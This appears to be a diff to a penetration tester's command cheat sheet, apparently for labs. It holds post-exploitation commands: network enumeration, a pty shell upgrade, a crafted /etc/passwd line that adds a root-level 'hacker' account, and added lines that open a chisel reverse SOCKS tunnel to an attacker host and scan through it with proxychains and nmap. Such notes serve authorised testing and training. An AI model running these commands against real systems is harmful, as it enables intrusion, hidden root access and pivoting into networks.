@@ -21,6 +21,9 @@ hostname
 ip a && ip route show
 /sbin/route
 cat /etc/iptables
+tcpdump -i tun0 icmp
+./chisel_linux64 client kali-docker:9999 R:socks
+sudo proxychains nmap -v -sT -Pn --top-ports 1000 "$rhost"
 
 # user
 sudo -l
@@ -30,3 +33,4 @@ id && whoami && groups
 openssl passwd -1 -salt ignite pass
 python -c 'import pty; pty.spawn("/bin/bash");' && export TERM=xterm
 passwd line (password=pass): hacker:$1$ignite$ecpCwhwORTaNyHu4pN9MD/:0:0:root:/root:/bin/bash
+sudo sed -i '/^socks4/ s/^/#/' /etc/proxychains.conf && echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
